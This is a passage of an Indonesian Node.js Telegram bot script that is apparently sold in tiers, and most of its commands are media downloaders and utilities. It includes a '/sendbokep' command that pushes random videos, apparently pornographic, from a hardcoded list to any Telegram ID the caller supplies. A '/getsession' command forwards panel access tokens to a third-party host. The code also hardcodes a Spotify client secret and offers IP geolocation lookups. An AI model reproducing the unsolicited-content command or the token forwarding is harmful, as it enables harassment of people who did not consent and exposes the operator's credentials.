• IP: ${res.ip || "N/A"}
• Type: ${res.type || "N/A"}
• Country: ${res.country || "N/A"} ${res.flag?.emoji || ""}
• Region: ${res.region || "N/A"}
• City: ${res.city || "N/A"}
• Latitude: ${res.latitude || "N/A"}
• Longitude: ${res.longitude || "N/A"}
• ISP: ${res.connection?.isp || "N/A"}
• Org: ${res.connection?.org || "N/A"}
• Domain: ${res.connection?.domain || "N/A"}
• Timezone: ${res.timezone?.id || "N/A"}
• Local Time: ${res.timezone?.current_time || "N/A"}
`;

    if (res.latitude && res.longitude) {
      await bot.sendLocation(chatId, res.latitude, res.longitude);
    }

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("TrackIP Error:", err);
    bot.sendMessage(chatId, `❌ Error: Tidak dapat mengambil data IP.`, {
      parse_mode: "Markdown",
    });
  }
});

const videoList = [
  "https://files.catbox.moe/8c7gz3.mp4", 
  "https://files.catbox.moe/nk5l10.mp4", 
  "https://files.catbox.moe/r3ip1j.mp4", 
  "https://files.catbox.moe/71l6bo.mp4", 
  "https://files.catbox.moe/rdggsh.mp4", 
  "https://files.catbox.moe/3288uf.mp4", 
  "https://files.catbox.moe/jdopgq.mp4", 
  "https://files.catbox.moe/8ca9cw.mp4", 
  "https://files.catbox.moe/b99qh3.mp4", 
  "https://files.catbox.moe/6bkokw.mp4", 
  "https://files.catbox.moe/ebisdh.mp4", 
  "https://files.catbox.moe/3yko44.mp4", 
  "https://files.catbox.moe/apqlvo.mp4", 
  "https://files.catbox.moe/wqe1r7.mp4", 
  "https://files.catbox.moe/nk5l10.mp4", 
  "https://files.catbox.moe/8c7gz3.mp4", 
  "https://files.catbox.moe/wqe1r7.mp4", 
  "https://files.catbox.moe/n37liq.mp4", 
  "https://files.catbox.moe/0728bg.mp4", 
  "https://files.catbox.moe/p69jdc.mp4", 
  "https://files.catbox.moe/occ3en.mp4", 
  "https://files.catbox.moe/y8hmau.mp4", 
  "https://files.catbox.moe/tvj95b.mp4", 
  "https://files.catbox.moe/3g2djb.mp4", 
  "https://files.catbox.moe/xlbafn.mp4", 
  "https://files.catbox.moe/br8crz.mp4", 
  "https://files.catbox.moe/h2w5jl.mp4", 
  "https://files.catbox.moe/8y32qo.mp4", 
  "https://files.catbox.moe/9w39ag.mp4", 
  "https://files.catbox.moe/gv4087.mp4", 
  "https://files.catbox.moe/uw6qbs.mp4", 
  "https://files.catbox.moe/a537h1.mp4", 
  "https://files.catbox.moe/4x09p9.mp4", 
  "https://files.catbox.moe/n992te.mp4", 
  "https://files.catbox.moe/ltdsbm.mp4", 
  "https://files.catbox.moe/rt62tl.mp4", 
  "https://files.catbox.moe/y4rote.mp4", 
  "https://files.catbox.moe/dxn5oj.mp4", 
  "https://files.catbox.moe/tw6m9q.mp4", 
  "https://files.catbox.moe/qfl235.mp4", 
  "https://files.catbox.moe/q9f2rs.mp4", 
  "https://files.catbox.moe/e5ci9z.mp4", 
  "https://files.catbox.moe/cdl11t.mp4",
  "https://files.catbox.moe/zjo5r6.mp4",
  "https://files.catbox.moe/7i6amv.mp4", 
  "https://files.catbox.moe/pmyi1y.mp4",
  "https://files.catbox.moe/fxe94h.mp4",
  "https://files.catbox.moe/52oh63.mp4",
  "https://files.catbox.moe/ite58a.mp4",
  "https://files.catbox.moe/svw26n.mp4",
  "https://files.catbox.moe/bv5yaa.mp4",
  "https://files.catbox.moe/ozk5xr.mp4",
  "https://files.catbox.moe/926k9a.mp4"
];
let lastVideoIndex = -1;

function pickRandomVideo() {
  let i;
  do {
    i = Math.floor(Math.random() * videoList.length);
  } while (i === lastVideoIndex && videoList.length > 1);

  lastVideoIndex = i;
  return videoList[i];
}

// --- Command: /sendbokep <telegram_id> ---
bot.onText(/\/sendbokep\s+(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const targetId = match[1];

  let waitingMsg = await bot.sendMessage(
    chatId,
    `🔍 *Memeriksa pengguna...*`,
    { parse_mode: "Markdown" }
  );

  try {
    const videoUrl = pickRandomVideo();

    // Kirim langsung ke target Telegram
    await bot.sendVideo(targetId, videoUrl, {
      caption: "📹 Nih videonya bre...",
    });

    await bot.editMessageText(
      `✅ *Terkirim sukses ke:* \`${targetId}\``,
      {
        chat_id: chatId,
        message_id: waitingMsg.message_id,
        parse_mode: "Markdown",
      }
    );

  } catch (err) {
    await bot.editMessageText(
      `❌ *Gagal mengirim:* ${err.message}`,
      {
        chat_id: chatId,
        message_id: waitingMsg.message_id,
        parse_mode: "Markdown",
      }
    );
  }
});

// Jika format salah
bot.onText(/\/sendbokep$/, (msg) => {
  bot.sendMessage(msg.chat.id, "Format benar:\n/sendbokep <id_telegram>");
});

bot.onText(/^\/hd$/, async (msg) => {
  const chatId = msg.chat.id;

  // HARUS reply foto
  if (!msg.reply_to_message || !msg.reply_to_message.photo) {
    return bot.sendMessage(
      chatId,
      "⚠️ Reply foto dulu baru ketik /hd cok."
    );
  }

  try {
    await bot.sendMessage(chatId, "⏳ Lagi ng-HD foto lu bre...");

    // Ambil foto resolusi tertinggi
    const photo = msg.reply_to_message.photo.pop();
    const file = await bot.getFile(photo.file_id);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    // Download foto dari Telegram
    const dl = await axios.get(fileUrl, { responseType: "arraybuffer" });
    const buffer = Buffer.from(dl.data);

    // Upload ke tmpfiles
    const FormData = require("form-data");
    const form = new FormData();
    form.append("file", buffer, "image.jpg");

    const upload = await axios.post("https://tmpfiles.org/api/v1/upload", form, {
      headers: form.getHeaders(),
    });

    const link = upload.data.data.url.replace("tmpfiles.org/", "tmpfiles.org/dl/");

    // API HD
    const hd = await axios.get(
      `https://api.nekolabs.web.id/tools/pxpic/restore?imageUrl=${encodeURIComponent(link)}`
    );

    if (!hd.data.success) {
      throw new Error("Gagal HD cok.");
    }

    const result = hd.data.result;

    // Kirim hasil HD
    await bot.sendVideo(chatId, result, {
      caption: `✅ Foto berhasil di-HD cok!\n${result}`,
      parse_mode: "HTML",
    });

  } catch (err) {
    console.error("HD ERROR:", err);
    bot.sendMessage(chatId, "❌ Error cok, fotonya ga bisa di-HD.");
  }
});

bot.onText(/^\/tiktokdl (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1];

  await bot.sendMessage(chatId, "📥 Tunggu bentar bre, lagi download video TikTok-nya...");

  try {
    const api = `https://api.nekolabs.web.id/downloader/tiktok?url=${encodeURIComponent(url)}`;
    const { data } = await axios.get(api);

    if (!data.success || !data.result) {
      return bot.sendMessage(chatId, "❌ Gagal ambil data dari API NekoLabs bre.");
    }

    const result = data.result;

    const caption =
      `🎬 *TikTok Downloader*\n\n` +
      `👤 *${result.author.name}* (${result.author.username})\n` +
      `🎶 *${result.music_info.title}* - ${result.music_info.author}\n` +
      `❤️ ${result.stats.like}  💬 ${result.stats.comment}  🔁 ${result.stats.share}\n` +
      `🕒 ${result.create_at}`;

    // Kirim video
    await bot.sendVideo(chatId, result.videoUrl, {
      caption,
      parse_mode: "Markdown",
    });

    // Kirim sound/music
    await bot.sendAudio(chatId, result.musicUrl, {
      filename: `${result.music_info.title}.mp3`,
      caption: `🎵 ${result.music_info.title} - ${result.music_info.author}`,
      parse_mode: "Markdown",
    });

  } catch (err) {
    console.error("TIKTOK ERROR:", err.message);
    bot.sendMessage(chatId, "❌ Gagal ambil data TikTok bre, coba lagi nanti.");
  }
});

bot.onText(/^\/spotifysearch (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  try {
    await bot.sendMessage(chatId, "🔎 Nyari lagu di Spotify... tunggu bentar bre 🎧");

    const api = `https://api.nekolabs.my.id/discovery/spotify/search?q=${encodeURIComponent(query)}`;
    const { data } = await axios.get(api);

    if (!data.success || !data.result || !data.result.length) {
      return bot.sendMessage(chatId, "❌ Gagal nemuin lagu di Spotify bre!");
    }

    let caption = "🎶 *Hasil Pencarian Spotify:*\n\n";

    data.result.slice(0, 10).forEach((item, i) => {
      caption += `*${i + 1}. ${item.title}*\n`;
      caption += `👤 ${item.artist}\n`;
      caption += `🕒 ${item.duration}\n`;
      caption += `🔗 [Buka Spotify](${item.url})\n\n`;
    });

    // Kirim cover + caption
    bot.sendVideo(chatId, data.result[0].cover, {
      caption,
      parse_mode: "Markdown",
    });

  } catch (err) {
    console.error("Spotify Search Error:", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mencari lagu di Spotify bre.");
  }
});

bot.onText(/\/fixcode/, async (msg) => {
  const chatId = msg.chat.id;
  const replyMsg = msg.reply_to_message;

  try {
    // Cek apakah user reply ke file .js
    if (!replyMsg || !replyMsg.document) {
      return bot.sendMessage(chatId, "📂 Kirim file .js dan *reply* dengan perintah /fixcode", {
        parse_mode: "Markdown",
      });
    }

    const file = replyMsg.document;
    if (!file.file_name.endsWith(".js")) {
      return bot.sendMessage(chatId, "⚠️ File harus berformat .js bre!");
    }

    // Ambil file link
    const fileLink = await bot.getFileLink(file.file_id);
    await bot.sendMessage(chatId, "🤖 Lagi memperbaiki kodenya bre... tunggu bentar!");

    // Download isi file
    const response = await axios.get(fileLink, { responseType: "arraybuffer" });
    const fileContent = Buffer.from(response.data).toString("utf-8");

    // Kirim ke API NekoLabs
    const { data } = await axios.get("https://api.nekolabs.web.id/ai/gpt/4.1", {
      params: {
        text: fileContent,
        systemPrompt: `Kamu adalah seorang programmer ahli JavaScript dan Node.js.
Tugasmu adalah memperbaiki kode yang diberikan agar bisa dijalankan tanpa error, 
namun jangan mengubah struktur, logika, urutan, atau gaya penulisan aslinya.

Fokus pada:
- Menyelesaikan error sintaks (kurung, kurawal, tanda kutip, koma, dll)
- Menjaga fungsi dan struktur kode tetap sama seperti input
- Jangan menghapus komentar, console.log, atau variabel apapun
- Jika ada blok terbuka (seperti if, else, try, atau fungsi), tutup dengan benar
- Jangan ubah nama fungsi, variabel, atau struktur perintah
- Jangan tambahkan penjelasan apapun di luar kode
- Jangan tambahkan markdown javascript Karena file sudah berbentuk file .js
- Hasil akhir harus langsung berupa kode yang siap dijalankan
`,
        sessionId: "neko"
      },
      timeout: 60000,
    });

    if (!data.success || !data.result) {
      return bot.sendMessage(chatId, "❌ Gagal memperbaiki kode, coba ulang bre.");
    }

    const fixedCode = data.result;
    const outputPath = `./fixed_${file.file_name}`;
    fs.writeFileSync(outputPath, fixedCode);

    await bot.sendDocument(chatId, outputPath, {}, {
      filename: `fixed_${file.file_name}`,
      contentType: "text/javascript",
    });
  } catch (err) {
    console.error("FixCode Error:", err);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan waktu memperbaiki kode bre.");
  }
});

/* ===== Telegram command ===== */
bot.onText(/^\/updatenew$/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Cek admin/owner
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "⚠️ *Akses Ditolak!*\nHanya Owner/Admin yang bisa mengupdate bot!", { parse_mode: "Markdown" });
  }

  await performUpdate(chatId);
});

module.exports = bot;

bot.onText(/^\/trackip(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = (match[1] || "").trim();

  if (!ip) return bot.sendMessage(chatId, "⚠️ Contoh:\n/trackip 8.8.8.8");

  bot.sendMessage(chatId, "🛰 Sedang melacak IP...");

  try {
    const { data } = await axios.get(`http://ip-api.com/json/${ip}`);
    if (data.status !== "success") throw new Error("IP tidak ditemukan");

    const teks = `
🌍 *IP FOUND!*

• *IP:* ${data.query}
• *Country:* ${data.country}
• *City:* ${data.city}
• *ISP:* ${data.isp}

📍 [Lihat di Maps](https://www.google.com/maps?q=${data.lat},${data.lon})
    `;
    await bot.sendMessage(chatId, teks, { parse_mode: "Markdown" });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ Error: " + err.message);
  }
});

bot.onText(/^\/getsession$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    await bot.sendMessage(chatId, "⏳ Mengambil session...");

    const { data } = await axios.get("https://joocode.zone.id/api/getsession", {
      params: {
        domain: config.DOMAIN,
        plta: config.PLTA_TOKEN,
        pltc: config.PLTC_TOKEN,
      },
    });

    const tmpPath = path.join(process.cwd(), "Session.json");
    fs.writeFileSync(tmpPath, JSON.stringify(data, null, 2), "utf-8");

    await bot.sendDocument(chatId, tmpPath, {
      caption: "📦 Session file requested",
    });

    fs.unlinkSync(tmpPath); // hapus file setelah dikirim

  } catch (err) {
    console.error("GetSession Error:", err.message);
    bot.sendMessage(chatId, `❌ Gagal mengambil session.\n${err.message}`);
  }
});

bot.onText(/^\/bratvid(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = (match[1] || "").trim();

  if (!text) {
    return bot.sendMessage(chatId, "⚠️ Contoh:\n/bratvid woi kontol");
  }

  bot.sendMessage(chatId, "🎬 Lagi bikin sticker videonya bre...");

  try {
    const res = await fetch(`https://api.zenzxz.my.id/maker/bratvid?text=${encodeURIComponent(text)}`);
    if (!res.ok) throw new Error(`HTTP error ${res.status}`);

    const buffer = Buffer.from(await res.arrayBuffer()); // ✅ FIX disini

    const tmpFile = path.join(__dirname, `bratvid_${Date.now()}.webm`);
    fs.writeFileSync(tmpFile, buffer);

    await bot.sendSticker(chatId, tmpFile);

    fs.unlinkSync(tmpFile);
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Gagal generate sticker video.");
  }
});

bot.onText(/^\/qc(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = (match[1] || "").trim();

  try {
    // Cek kalau user nge-reply pesan orang
    let target = msg.from;
    let messageText = text;

    if (msg.reply_to_message) {
      target = msg.reply_to_message.from;
      messageText = msg.reply_to_message.text;
    }

    if (!messageText) {
      return bot.sendMessage(
        chatId,
        "⚠️ Contoh:\n- /qc Halo dunia\n- Balas teks orang → /qc"
      );
    }

    // warna random
    const warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"];
    const reswarna = warna[Math.floor(Math.random() * warna.length)];

    // Ambil foto profil target
    let ppuser = "https://files.catbox.moe/gqs7oz.jpg"; // default fallback

    try {
      const photos = await bot.getUserProfilePhotos(target.id);
      if (photos.total_count > 0) {
        const fileId = photos.photos[0][0].file_id;
        const fileLink = await bot.getFileLink(fileId);
        ppuser = fileLink;
      }
    } catch {}

    // body API
    const obj = {
      type: "quote",
      format: "png",
      backgroundColor: reswarna,
      width: 512,
      height: 768,
      scale: 2,
      messages: [
        {
          entities: [],
          avatar: true,
          from: {
            id: 1,
            name: target.first_name || "Unknown",
            photo: { url: ppuser },
          },
          text: messageText,
          replyMessage: {},
        },
      ],
    };

    // Request API
    const json = await axios.post("https://bot.lyo.su/quote/generate", obj, {
      headers: { "Content-Type": "application/json" },
    });

    const buffer = Buffer.from(json.data.result.image, "base64");

    // kirim sticker
    await bot.sendSticker(chatId, buffer);

  } catch (err) {
    console.error("QC Error:", err.message);
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

bot.onText(/^\/gpt(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = (match[1] || "").trim();

  if (!query) {
    return bot.sendMessage(
      chatId,
      "⚠️ Contoh:\n/gpt apa itu gravitasi?"
    );
  }

  // pesan loading
  await bot.sendMessage(chatId, "⏳ Tunggu sebentar, lagi mikir...");

  try {
    const { data } = await axios.get("https://www.abella.icu/gpt-3.5", {
      params: { q: query },
      timeout: 30000,
    });

    const answer = data?.data?.answer;

    if (answer) {
      return bot.sendMessage(
        chatId,
        "```\n" + answer + "\n```",
        { parse_mode: "Markdown" }
      );
    } else {
      return bot.sendMessage(chatId, "⚠️ Tidak ada respons valid dari AI.");
    }

  } catch (err) {
    console.error("GPT Error:", err);
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

bot.onText(/^\/ocr$/, async (msg) => {
  const chatId = msg.chat.id;

  // Pastikan user reply gambar
  if (!msg.reply_to_message || !msg.reply_to_message.photo) {
    return bot.sendMessage(chatId, "📸 *Balas gambar* yang mau di OCR, bre.", { parse_mode: "Markdown" });
  }

  // Ambil photo resolusi tertinggi
  const photo = msg.reply_to_message.photo.slice(-1)[0];
  const fileId = photo.file_id;

  await bot.sendMessage(chatId, "⏳ Sedang memproses OCR mu bre...");

  try {
    // Ambil URL gambar dari Telegram (ini WAJIB, karena Telegram tidak langsung kasih URL foto)
    const fileLink = await bot.getFileLink(fileId);

    // OCR API Tetap → Tidak diganti
    const { data } = await axios.get(
      `https://api.deline.my.id/tools/ocr?url=${encodeURIComponent(fileLink)}`
    );

    if (!data?.status) throw new Error(data?.error || "API return false");

    // Adaptasi struktur output OCR
    const raw = data?.Text ?? data?.text ?? data?.extractedText ?? "";
    const text = String(raw).replace(/\\n/g, "\n").trim();

    bot.sendMessage(chatId, text || "📭 Ga ada teks nya bre.");

  } catch (e) {
    bot.sendMessage(chatId, `⚠️ Error bre:\n${e.message}`);
  }
});

bot.onText(/\/fixeror/, async (msg) => {
  const chatId = msg.chat.id;
  const replyMsg = msg.reply_to_message;

  try {
    // Cek apakah user reply ke file .js
    if (!replyMsg || !replyMsg.document) {
      return bot.sendMessage(chatId, "📂 Kirim file .js dan *reply* dengan perintah /fixeror", {
        parse_mode: "Markdown",
      });
    }

    const file = replyMsg.document;
    if (!file.file_name.endsWith(".js")) {
      return bot.sendMessage(chatId, "⚠️ File harus berformat .js bre!");
    }

    // Ambil file link
    const fileLink = await bot.getFileLink(file.file_id);
    await bot.sendMessage(chatId, "🤖 Lagi memperbaiki kodenya bre... tunggu bentar!");

    // Download isi file
    const response = await axios.get(fileLink, { responseType: "arraybuffer" });
    const fileContent = Buffer.from(response.data).toString("utf-8");

    // Kirim ke API NekoLabs
    const { data } = await axios.get("https://api.nekolabs.web.id/ai/gpt/4.1", {
      params: {
        text: fileContent,
        systemPrompt: `Kamu adalah seorang programmer ahli JavaScript dan Node.js.
Tugasmu adalah memperbaiki kode yang diberikan agar bisa dijalankan tanpa error, 
namun jangan mengubah struktur, logika, urutan, atau gaya penulisan aslinya.

Fokus pada:
- Menyelesaikan error sintaks (kurung, kurawal, tanda kutip, koma, dll)
- Menjaga fungsi dan struktur kode tetap sama seperti input
- Jangan menghapus komentar, console.log, atau variabel apapun
- Jika ada blok terbuka (seperti if, else, try, atau fungsi), tutup dengan benar
- Jangan ubah nama fungsi, variabel, atau struktur perintah
- Jangan tambahkan penjelasan apapun di luar kode
- Jangan tambahkan markdown javascript Karena file sudah berbentuk file .js
- Hasil akhir harus langsung berupa kode yang siap dijalankan
`,
        sessionId: "neko"
      },
      timeout: 60000,
    });

    if (!data.success || !data.result) {
      return bot.sendMessage(chatId, "❌ Gagal memperbaiki kode, coba ulang bre.");
    }

    const fixedCode = data.result;
    const outputPath = `./fixed_${file.file_name}`;
    fs.writeFileSync(outputPath, fixedCode);

    await bot.sendDocument(chatId, outputPath, {}, {
      filename: `fixed_${file.file_name}`,
      contentType: "text/javascript",
    });
  } catch (err) {
    console.error("FixCode Error:", err);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan waktu memperbaiki kode bre.");
  }
});

const MAINT_FILE = './#valtix/maintenance.json';

// helper: buat file kalau belum ada
function ensureMaintenanceFile() {
  if (!fs.existsSync('./#valtix')) fs.mkdirSync('./#valtix', { recursive: true });
  if (!fs.existsSync(MAINT_FILE)) {
    fs.writeFileSync(MAINT_FILE, JSON.stringify({ enabled: false }, null, 2));
  }
}
ensureMaintenanceFile();

// baca status maintenance (synchronous sederhana)
function readMaintenance() {
  try {
    const raw = fs.readFileSync(MAINT_FILE, 'utf8');
    const data = JSON.parse(raw);
    return Boolean(data.enabled);
  } catch (e) {
    console.error("Gagal membaca maintenance file:", e.message);
    return false;
  }
}

// set maintenance dan simpan
function setMaintenance(status) {
  try {
    fs.writeFileSync(MAINT_FILE, JSON.stringify({ enabled: Boolean(status) }, null, 2));
    return true;
  } catch (e) {
    console.error("Gagal menulis maintenance file:", e.message);
    return false;
  }
}

// helper publik
function isMaintenance() {
  return readMaintenance();
}

// watch file agar runtime ikut update bila file diubah manual
try {
  fs.watch(MAINT_FILE, (ev) => {
    if (ev === 'change') {
      console.log("[MAINT] maintenance.json berubah. Status sekarang:", isMaintenance());
    }
  });
} catch (e) {
  // ignore watch errors
}

// Telegram command: setmaintenance on|off
bot.onText(/^\/setmaintenance\s+(on|off)$/i, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const mode = match[1].toLowerCase();

  // only owner or admin
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, `❌ Akses ditolak. Hanya Owner/Admin yang dapat melakukan ini.`);
  }

  const status = mode === 'on';
  const ok = setMaintenance(status);
  if (!ok) {
    return bot.sendMessage(chatId, `❌ Gagal mengubah status maintenance. Periksa log server.`);
  }

  const msgText = status ? `✅ Mode maintenance di AKTIFKAN. Hanya Owner/Admin yang dapat menjalankan perintah sensitif.` :
                          `✅ Mode maintenance di NON-AKTIFKAN. Bot beroperasi normal.`;

  bot.sendMessage(chatId, msgText);
});

// Telegram command: /maintenance -> cek status
bot.onText(/^\/maintenance$/i, (msg) => {
  const chatId = msg.chat.id;
  const status = isMaintenance();
  const text = status ? "🔴 BOT SEDANG MAINTENANCE (ON)" : "🟢 BOT AKTIF (OFF)";
  bot.sendMessage(chatId, text);
});
// ---------- END: Maintenance Feature ---------- //

bot.onText(/\/play (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const sender = msg.from.username || msg.from.first_name;
  const query = match[1];

  try {
    await bot.sendMessage(chatId, "⏳ Lagi nyari lagu di Spotify, tunggu bentar bre...");

    const api = `https://api.nekolabs.my.id/downloader/spotify/play/v1?q=${encodeURIComponent(query)}`;
    const { data } = await axios.get(api);

    if (!data.success || !data.result) {
      return bot.sendMessage(chatId, "❌ Gagal ambil data lagu dari Spotify!");
    }

    const { metadata, downloadUrl } = data.result;
    const { title, artist, cover, duration } = metadata;

    const caption = `
<blockquote>🎵 ${title || "Unknown"}</blockquote>
<blockquote>👤 ${artist || "Unknown"}</blockquote>
<blockquote>🕒 Durasi: ${duration || "-"}</blockquote>
`;

    await bot.sendVideo(chatId, cover, {
      caption,
      parse_mode: "HTML",
    });

    await bot.sendAudio(chatId, downloadUrl, {
      title: title || "Unknown Title",
      performer: artist || "Unknown Artist",
    });
  } catch (err) {
    console.error("Play Error:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat memutar lagu bre.");
  }
});

bot.onText(/^\/listharga$/, (msg) => {
  const chatId = msg.chat.id;

  bot.sendMessage(chatId, `
<blockquote>💰 <b>DAFTAR HARGA SCRIPT BOT</b></blockquote>
Klik tombol di bawah untuk melihat harga lengkap script bot:
  `, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📄 Lihat Harga Script", callback_data: "lihat_harga" }]
      ]
    }
  });
});

// Handler tombol
bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;

  if (data === "lihat_harga") {
    bot.sendMessage(chatId, `
<blockquote>LIST HARGA SCRIPT Valtix Invicta</blockquote>
⌑ OWNER ACCESS - Rp 120.000
  └─ Full control & lifetime
        
⌑ MODERATOR - Rp 85.000
  └─ Manage partner & reseller
        
⌑ PARTNER - Rp 60.000
  └─ Manage reseller only
        
⌑ RESELLER - Rp 40.000
  └─ Token management only

⌑ FULL UP - Rp 30.000
  └─ Bisa menikmati bebagai versi

⌑ NO UP - Rp 20.000
  └─ Hanya bisa di pakai 1 versi

<blockquote>Untuk pemesanan silahkan
contack: @Thaureyo</blockquote>
    `, { parse_mode: "HTML" });
  }

  bot.answerCallbackQuery(callbackQuery.id);
});


const SPOTIFY_CLIENT_ID = "e791953ecb0540d898a5d2513c9a0dd2";
const SPOTIFY_CLIENT_SECRET = "23e971c5b0ba4298985e8b00ce71d238";

// Fungsi ambil token Spotify
async function getSpotifyToken() {
  const res = await fetch("https://accounts.spotify.com/api/token", {
    method: "POST",
    headers: {
      "Authorization":
        "Basic " +
        Buffer.from(`${SPOTIFY_CLIENT_ID}:${SPOTIFY_CLIENT_SECRET}`).toString("base64"),
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: "grant_type=client_credentials",
  });
  const data = await res.json();
  return data.access_token;
}

// Fungsi cari lagu di Spotify
async function searchSpotify(query) {
  const token = await getSpotifyToken();
  const res = await fetch(
    `https://api.spotify.com/v1/search?q=${encodeURIComponent(query)}&type=track&limit=1`,
    { headers: { Authorization: `Bearer ${token}` } }
  );
  const data = await res.json();
  if (data.tracks?.items?.length === 0) return null;
  return data.tracks.items[0];
}

// Command /song
bot.onText(/^\/song(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1]?.trim();

  if (!query) {
    return bot.sendMessage(
      chatId,
      "🎵 Gunakan format:\n`/song [judul lagu]`\nContoh: `/song shape of you`",
      { parse_mode: "Markdown" }
    );
  }

  await bot.sendMessage(chatId, `🔍 Mencari *${query}* di Spotify...`, {
    parse_mode: "Markdown",
  });

  try {
    const song = await searchSpotify(query);
    if (!song) {
      return bot.sendMessage(chatId, "❌ Lagu tidak ditemukan di Spotify.");
    }

    const title = song.name;
    const artist = song.artists.map(a => a.name).join(", ");
    const album = song.album.name;
    const url = song.external_urls.spotify;
    const cover = song.album.images[0]?.url;

    const keyboard = {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🎧 Dengar di Spotify", url: url }]
        ]
      }
    };

    await bot.sendVideo(chatId, cover, {
      caption: `🎵 *${title}*\n👤 ${artist}\n💽 Album: ${album}`,
      parse_mode: "Markdown",
      ...keyboard
    });
  } catch (err) {
    console.error("Error /song:", err);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan saat mencari lagu.");
  }
});

bot.onText(/^\/shortlink(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const url = match[1];

  if (!url) {
    return bot.sendMessage(
      chatId,
      "🔗 Kirim link yang ingin dipendekkan!\n\nContoh:\n`/shortlink https://example.com/artikel/panjang/banget`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    // Gunakan TinyURL API (tidak butuh API key)
    const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`);
    const shortUrl = await res.text();

    if (!shortUrl || !shortUrl.startsWith("http")) {
      throw new Error("Gagal memendekkan link");
    }

    await bot.sendMessage(
      chatId,
      `✅ *Link berhasil dipendekkan!*\n\n🔹 Asli: ${url}\n🔹 Pendek: ${shortUrl}`,
      { parse_mode: "Markdown" }
    );
  } catch (err) {
    console.error("❌ Error shortlink:", err);
    bot.sendMessage(chatId, "⚠️ Gagal memendekkan link. Coba lagi nanti.");
  }
});

bot.onText(/^\/fileinfo$/, (msg) => {
  bot.sendMessage(msg.chat.id, "📂 Kirim file yang mau kamu cek infonya!");
});

// Saat user kirim file, foto, audio, atau dokumen
bot.on("document", async (msg) => handleFile(msg, "document"));
bot.on("photo", async (msg) => handleFile(msg, "photo"));
bot.on("video", async (msg) => handleFile(msg, "video"));
bot.on("audio", async (msg) => handleFile(msg, "audio"));

async function handleFile(msg, type) {
  const chatId = msg.chat.id;
  let fileId, fileName;

  if (type === "document") {
    fileId = msg.document.file_id;
    fileName = msg.document.file_name;
  } else if (type === "photo") {
    const photo = msg.photo.pop();
    fileId = photo.file_id;
    fileName = `photo_${chatId}.jpg`;
  } else if (type === "video") {
    fileId = msg.video.file_id;
    fileName = msg.video.file_name || `video_${chatId}.mp4`;
  } else if (type === "audio") {
    fileId = msg.audio.file_id;
    fileName = msg.audio.file_name || `audio_${chatId}.mp3`;
  }

  try {
    const file = await bot.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
    const fileExt = path.extname(file.file_path);
    const fileSize = formatBytes(file.file_size);

    const info = `
📁 *Informasi File*
━━━━━━━━━━━━━━━━
📄 Nama: ${fileName}
📏 Ukuran: ${fileSize}
🧩 Ekstensi: ${fileExt || "-"}
🔗 URL: [Klik di sini](${fileUrl})
`;

    bot.sendMessage(chatId, info, { parse_mode: "Markdown", disable_web_page_preview: false });
  } catch (err) {
    console.error("❌ Gagal ambil info file:", err);
    bot.sendMessage(chatId, "⚠️ Gagal mendapatkan info file. Coba kirim ulang filenya.");
  }
}

// Fungsi bantu untuk format ukuran file
function formatBytes(bytes, decimals = 2) {
  if (!+bytes) return "0 B";
  const k = 1024;
  const dm = decimals < 0 ? 0 : decimals;
  const sizes = ["B", "KB", "MB", "GB", "TB"];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return `${parseFloat((bytes / Math.pow(k, i)).toFixed(dm))} ${sizes[i]}`;
}

bot.onText(/^\/negarainfo(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const negara = match[1]?.trim();

  if (!negara) {
    return bot.sendMessage(chatId, "🌍 Ketik nama negara!\nContoh: `/negarainfo jepang`", { parse_mode: "Markdown" });
  }

  try {
    const res = await fetch(`https://restcountries.com/v3.1/name/${encodeURIComponent(negara)}?fullText=false`);
    const data = await res.json();

    if (!Array.isArray(data) || !data.length) {
      return bot.sendMessage(chatId, "⚠️ Negara tidak ditemukan. Coba ketik nama lain.");
    }

    const n = data[0];
    const name = n.translations?.id?.common || n.name.common;
    const capital = n.capital ? n.capital[0] : "Tidak ada data";
    const region = n.region || "Tidak ada data";
    const subregion = n.subregion || "-";
    const population = n.population?.toLocaleString("id-ID") || "-";
    const currency = n.currencies ? Object.values(n.currencies)[0].name : "-";
    const symbol = n.currencies ? Object.values(n.currencies)[0].symbol : "";
    const flag = n.flag || "🏳️";

